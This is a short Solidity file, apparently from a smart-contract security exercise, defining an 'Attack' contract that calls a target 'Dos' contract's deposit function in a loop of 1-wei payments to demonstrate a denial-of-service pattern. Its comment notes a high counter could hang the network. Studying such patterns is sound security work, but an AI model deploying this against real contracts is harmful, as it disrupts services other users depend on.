// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "./Dos.sol";

contract Attack{
    Dos public dos;

    constructor(Dos _address){
        dos = _address;
    }

    function sendEthContract() public payable{

    }

    function attack() public{
        uint counter;
        while(counter<10){
            dos.deposit{value: 1 wei}();
            counter++;   //counter can be high and can hang the network
        }
        
    }
}